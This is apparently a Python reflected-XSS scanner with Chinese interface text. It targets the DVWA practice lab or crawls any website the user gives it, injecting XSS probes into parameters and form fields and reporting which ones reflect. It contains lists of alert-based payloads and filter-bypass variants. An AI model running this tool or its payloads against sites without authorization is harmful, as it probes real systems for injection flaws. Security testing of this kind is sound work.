import sys
import os
import requests
import urllib.parse
import time
import json
import urllib3
import re
import html
from typing import Dict, List, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init
from datetime import datetime

# ========== 配置区域 ==========
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_FILE = os.path.join(BASE_DIR, 'config', 'xss_payload.txt')
REPORT_DIR = os.path.join(BASE_DIR, 'scan_result', 'DvwaXSSScanner')
MAX_WORKERS = 10
# ==============================

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

try:
    from DVWAlogin import DvwaLogin
except ImportError as e:
    print(f"[ERROR] DVWA登录模块导入失败: {e}")
    sys.exit(1)

try:
    from crawler import VulnerabilityCrawler
except ImportError:
    print(f"[ERROR] 无法导入爬虫模块 crawler.py")
    sys.exit(1)


def detect_xss_context(response_text: str, payload: str) -> Dict[str, Any]:
    pos = response_text.find(payload)
    if pos == -1:
        decoded = urllib.parse.unquote(payload)
        pos = response_text.find(decoded)
        if pos == -1:
            return {'vulnerable': False}

    context_start = max(0, pos - 50)
    context_end = min(len(response_text), pos + len(payload) + 50)
    context = response_text[context_start:context_end]

    if re.search(rf'>[^<]*{re.escape(payload)}[^>]*<', context):
        return {'vulnerable': True, 'context': 'html_context', 'confidence': 'critical'}

    if re.search(rf'<script[^>]*>[^<]*{re.escape(payload)}', context, re.IGNORECASE):
        return {'vulnerable': True, 'context': 'javascript', 'confidence': 'critical'}

    if re.search(rf'=["\'][^"\']*{re.escape(payload)}[^"\']*["\']', context):
        if '"' in payload or "'" in payload or '>' in payload:
            return {'vulnerable': True, 'context': 'attribute', 'confidence': 'high'}

    if f'<!--{payload}-->' in context:
        return {'vulnerable': False, 'reason': 'in_html_comment'}

    if html.escape(payload) in context:
        return {'vulnerable': False, 'reason': 'html_encoded_safe'}

    return {'vulnerable': False}


class DvwaXSSScanner:
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = None
        self.base_url = None
        self.payloads = []
        self.bypass_payloads = []

        self.results = {
            'target_url': None,
            'vulnerabilities': [],
            'scan_time': None,
            'parameters_tested': 0,
            'xss_points_found': 0,
            'payloads_loaded': 0
        }

    def load_xss_payloads(self, filepath: str) -> bool:
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                self.payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]

            self.bypass_payloads = [
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",
                "javascript:alert(1)",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<scr<script>ipt>alert(1)</scr<script>ipt>",
                "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
                "<ScRiPt>alert(1)</ScRiPt>",
                "<img src=x onerror='alert(\"XSS\")'>",
            ]

            self.results['payloads_loaded'] = len(self.payloads) + len(self.bypass_payloads)
            print(f"[✓] 加载 {self.results['payloads_loaded']} 个payload")
            return True
        except Exception as e:
            print(f"[✗] 加载失败: {e}")
            return False

    def setup_session(self, dvwa_login_instance: DvwaLogin) -> bool:
        try:
            session_info = dvwa_login_instance.get_session_info()
            if not session_info or 'session' not in session_info:
                print(f"[✗] 会话信息无效")
                return False

            self.session = session_info['session']
            self.base_url = session_info['base_url']
            print(f"[✓] 会话设置成功: {self.base_url}")
            return True
        except Exception as e:
            print(f"[✗] 设置失败: {e}")
            return False

    def parse_parameters(self, url: str) -> Dict[str, List[str]]:
        parsed = urllib.parse.urlparse(url)
        return urllib.parse.parse_qs(parsed.query, keep_blank_values=True) if parsed.query else {}

    def send_request(self, url: str, method: str = 'GET', data: Dict = None, params: Dict = None) -> Tuple[
        bool, requests.Response]:
        for attempt in range(3):
            try:
                if method.upper() == 'GET':
                    response = self.session.get(url, params=params, timeout=self.timeout, verify=False)
                else:
                    response = self.session.post(url, data=data, timeout=self.timeout, verify=False)
                return True, response
            except requests.RequestException as e:
                if attempt == 2:
                    print(f"[!] 请求失败: {e}")
                    return False, None
                time.sleep(0.5)

    def test_reflected_xss(self, target_url: str) -> List[Dict[str, Any]]:
        print(f"\n[反射型XSS测试]")

        vulnerabilities = []
        parsed_params = self.parse_parameters(target_url)
        if not parsed_params:
            print(f"[!] 无URL参数")
            return []

        print(f"[✓] 发现参数: {list(parsed_params.keys())}")

        all_payloads = self.payloads + self.bypass_payloads
        total_tasks = len(parsed_params) * len(all_payloads)

        displayed_vulns = 0
        max_display = 10

        def test_single_payload(param_name, payload):
            test_params = {k: v[0] if v else "" for k, v in parsed_params.items()}
            test_params[param_name] = payload

            success, response = self.send_request(target_url.split('?')[0], params=test_params)
            if not success:
                return None

            context_result = detect_xss_context(response.text, payload)
            if context_result['vulnerable']:
                return {
                    'parameter': param_name,
                    'payload': payload,
                    'type': 'reflected',
                    'context': context_result['context'],
                    'confidence': context_result['confidence'],
                    'sample': response.text[:150] + '...' if len(response.text) > 150 else response.text
                }
            return None

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            future_to_test = {
                executor.submit(test_single_payload, param, payload): (param, payload)
                for param in parsed_params
                for payload in all_payloads
            }

            completed = 0
            for future in as_completed(future_to_test):
                completed += 1
                if completed % 50 == 0:
                    print(f"[进度] {completed}/{total_tasks} ({completed / total_tasks * 100:.1f}%)")

                result = future.result()
                if result:
                    vulnerabilities.append(result)
                    if displayed_vulns < max_display:
                        print(f"[✓] 漏洞: {result['parameter']} | {result['context']} | {result['payload'][:50]}")
                        displayed_vulns += 1

        if len(vulnerabilities) > max_display:
            print(f"[i] 发现 {len(vulnerabilities)} 个漏洞，显示前{max_display}个")

        self.results['parameters_tested'] = len(parsed_params)
        self.results['xss_points_found'] += len(vulnerabilities)
        return vulnerabilities

    def scan_dvwa_xss(self) -> Dict[str, Any]:
        if not self.session or not self.base_url:
            print(f"[✗] 未初始化会话")
            return {}

        target_url = f"{self.base_url}/vulnerabilities/xss_r/?name=test"

        self.results['target_url'] = target_url
        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')

        print(f"\n[扫描目标: {target_url}]")

        vulnerabilities = self.test_reflected_xss(target_url)

        self.results['vulnerabilities'] = vulnerabilities
        return self.generate_report()

    def generate_report(self) -> Dict[str, Any]:
        return {
            'scan_summary': {
                'target_url': self.results['target_url'],
                'scan_time': self.results['scan_time'],
                'parameters_tested': self.results['parameters_tested'],
                'xss_points_found': self.results['xss_points_found'],
                'payloads_loaded': self.results['payloads_loaded'],
                'total_vulnerabilities': len(self.results['vulnerabilities'])
            },
            'vulnerabilities': self.results['vulnerabilities'],
            'recommendations': [
                "实施Context-aware输出编码",
                "部署CSP内容安全策略",
                "使用HttpOnly + Secure Cookie标志",
                "定期扫描+手动验证",
                "开发安全编码规范"
            ]
        }

    def print_report(self, report: Dict[str, Any]):
        summary = report['scan_summary']
        vulns = report['vulnerabilities']

        print(f"\n{'=' * 70}")
        print(f"  DVWA XSS扫描报告 ")
        print(f"{'=' * 70}")
        print(f"目标: {summary['target_url']}")
        print(f"时间: {summary['scan_time']}")
        print(f"参数: {summary['parameters_tested']}个")
        print(f"漏洞: {summary['total_vulnerabilities']}个")
        print(f"{'=' * 70}")

        if not vulns:
            print(f"\n[✓] 未发现XSS漏洞")
            return


class NormalXSSScanner:
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "XSSScanner/1.0"})
        self.tested_injection_points = set()

        self.results = {
            'target_url': '普通网站多页面',
            'vulnerabilities': [],
            'scan_time': None,
            'parameters_tested': 0,
            'xss_points_found': 0,
            'payloads_loaded': 0
        }

        self.payloads = []
        self.load_payloads()

        print(f"[✓] 加载 {self.results['payloads_loaded']} 个payload")

    def load_payloads(self):
        self.payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "'\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            "\"><svg/onload=alert(1)>"
        ]
        self.results['payloads_loaded'] = len(self.payloads)

    def send_request(self, url: str, method: str = 'GET', data: Dict = None, params: Dict = None) -> Tuple[
        bool, requests.Response]:
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, timeout=self.timeout, verify=False)
            else:
                response = self.session.post(url, data=data, timeout=self.timeout, verify=False)
            return True, response
        except requests.exceptions.RequestException as e:
            print(f"[-] 请求失败: {e}")
            return False, None

    def test_injection_point_with_early_exit(self, url: str, method: str, injection_point: Dict) -> Any:
        param_name = injection_point.get('param') or injection_point.get('field')
        if not param_name:
            return None

        point_key = (url, f"{injection_point['name']}:{param_name}")
        if point_key in self.tested_injection_points:
            return None
        self.tested_injection_points.add(point_key)

        print(f"[TEST] 测试注入点: {injection_point['name']} -> {param_name}")

        for payload in self.payloads:
            if 'params' in injection_point:
                test_params = injection_point['params'].copy()
                test_params[param_name] = payload
                success, response = self.send_request(url, method, params=test_params)
            else:
                test_data = injection_point['form_data'].copy()
                test_data[param_name] = payload
                success, response = self.send_request(url, method, data=test_data)

            if not success or not response:
                continue

            context_result = detect_xss_context(response.text, payload)
            if context_result['vulnerable']:
                return {
                    'url': url,
                    'method': method,
                    'injection_point': injection_point['name'],
                    'payload': payload,
                    'type': 'reflected',
                    'context': context_result['context'],
                    'confidence': context_result['confidence']
                }

        return None

    def crawl_and_scan(self, base_url: str, max_depth: int = 2) -> Dict[str, Any]:
        print(f"目标: {base_url}  |  深度: {max_depth}")
        print("-" * 50)

        crawler = VulnerabilityCrawler(base_url, max_depth=max_depth)
        crawler.crawl(base_url)
        results = crawler.get_results()

        crawl_file = crawler.save_results()
        print(f"[✓] 爬取完成: {os.path.basename(crawl_file)}")

        total_points = sum(len(item['params']) for item in results.get('url_params', [])) + \
                       sum(len(form['form_data']) for form in results.get('forms', []))
        print(f"[✓] 发现 {total_points} 个待测注入点")

        print(f"\n开始XSS注入测试...")
        print("-" * 50)

        vulnerabilities = []
        completed = 0

        for item in results.get('url_params', []):
            url = item['url']
            method = item['method']
            params_template = {k: "test" for k in item['params']}

            for param_name in item['params']:
                completed += 1
                injection_point = {
                    'name': f"URL参数:{param_name}",
                    'param': param_name,
                    'params': params_template
                }

                result = self.test_injection_point_with_early_exit(url, method, injection_point)
                if result:
                    vulnerabilities.append(result)
                    print(f"[✓] 漏洞: {param_name} -> {result['payload'][:50]}")

        for item in results.get('forms', []):
            form_url = item['url']
            method = item['method']
            form_data = item['form_data']

            for field_name in form_data.keys():
                completed += 1
                injection_point = {
                    'name': f"表单字段:{field_name}",
                    'field': field_name,
                    'form_data': form_data
                }

                result = self.test_injection_point_with_early_exit(form_url, method, injection_point)
                if result:
                    vulnerabilities.append(result)
                    print(f"[✓] 漏洞: {field_name} -> {result['payload'][:50]}")

        self.results['vulnerabilities'] = vulnerabilities
        self.results['xss_points_found'] = len(vulnerabilities)
        return self.generate_report()

    def generate_report(self) -> Dict[str, Any]:
        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')
        return {
            'scan_summary': {
                'target_url': self.results['target_url'],
                'scan_time': self.results['scan_time'],
                'parameters_tested': len(self.tested_injection_points),
                'xss_points_found': self.results['xss_points_found'],
                'payloads_loaded': self.results['payloads_loaded'],
                'total_vulnerabilities': len(self.results['vulnerabilities'])
            },
            'vulnerabilities': self.results['vulnerabilities'],
            'recommendations': [
                "实施Context-aware输出编码",
                "部署CSP内容安全策略",
                "使用HttpOnly + Secure Cookie标志",
                "定期扫描+手动验证",
                "开发安全编码规范"
            ]
        }

    def print_report(self, report: Dict[str, Any]):
        summary = report['scan_summary']
        vulns = report['vulnerabilities']

        print(f"\n{'=' * 70}")
        print(f"  普通网站XSS扫描报告 ")
        print(f"{'=' * 70}")
        print(f"目标: {summary['target_url']}")
        print(f"时间: {summary['scan_time']}")
        print(f"测试注入点: {summary['parameters_tested']}个")
        print(f"发现漏洞: {summary['total_vulnerabilities']}个")
        print(f"{'=' * 70}")

        if not vulns:
            print(f"\n[✓] 未发现XSS漏洞")
            return

        print(f"\n[!] 发现漏洞详情:")
        for i, vuln in enumerate(vulns, 1):
            print(f"\n[#{i}] {vuln['injection_point']}")
            print(f"Payload: {vuln['payload'][:60]}...")
            print(f"URL: {vuln['url']}")
            if vuln.get('context'):
                print(f"Context: {vuln['context']}")

def main():
    print(f"\n{'=' * 70}")
    print(f" XSS漏洞扫描器 ")
    print(f"{'=' * 70}")

    print("\n请选择扫描模式:")
    print("1. 扫描DVWA靶场")
    print("2. 扫描普通网站")
    choice = input("请输入选项 (1 或 2): ").strip()

    if choice == '1':
        if not os.path.exists(PAYLOAD_FILE):
            print(f"[✗] Payload文件不存在: {PAYLOAD_FILE}")
            return

        dvwa_url = input(f"\n[?] 请输入DVWA URL: ").strip()
        if not dvwa_url:
            print(f"[✗] URL不能为空")
            return

        print(f"\n[步骤 1/2] 登录DVWA...")
        dvwa_login = DvwaLogin()
        if not dvwa_login.login(dvwa_url):
            print(f"[✗] 登录失败")
            return
        dvwa_login.test_connection()

        print(f"\n[步骤 2/2] 初始化并扫描...")
        scanner = DvwaXSSScanner(timeout=15)
        if not scanner.load_xss_payloads(PAYLOAD_FILE):
            return

        if not scanner.setup_session(dvwa_login):
            return

        report = scanner.scan_dvwa_xss()
        scanner.print_report(report)

        try:
            os.makedirs(REPORT_DIR, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"dvwa_xss_report_{timestamp}.json"
            filepath = os.path.join(REPORT_DIR, filename)

            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            print(f"\n[✓] 报告已保存: {filepath}")
        except Exception as e:
            print(f"[✗] 报告保存失败: {e}")

    elif choice == '2':
        base_url = input("\n请输入目标网站首页URL: ").strip()
        if not base_url:
            print(f"[✗] URL不能为空")
            return

        depth_input = input("请输入爬取深度: ").strip()
        max_depth = int(depth_input) if depth_input.isdigit() else 2

        print(f"\n初始化扫描器...")
        scanner = NormalXSSScanner(timeout=10)

        report = scanner.crawl_and_scan(base_url, max_depth)

        if report:
            scanner.print_report(report)

            report_dir = os.path.join(BASE_DIR, 'scan_result', 'NormalXSSScanner')
            os.makedirs(report_dir, exist_ok=True)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"normal_xss_report_{timestamp}.json"
            filepath = os.path.join(report_dir, filename)

            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)

            print(f"\n[✓] 报告已保存: {filepath}")
        else:
            print(f"[✗] 扫描失败")

    else:
        print(f"[✗] 无效选项")


if __name__ == "__main__":
    main()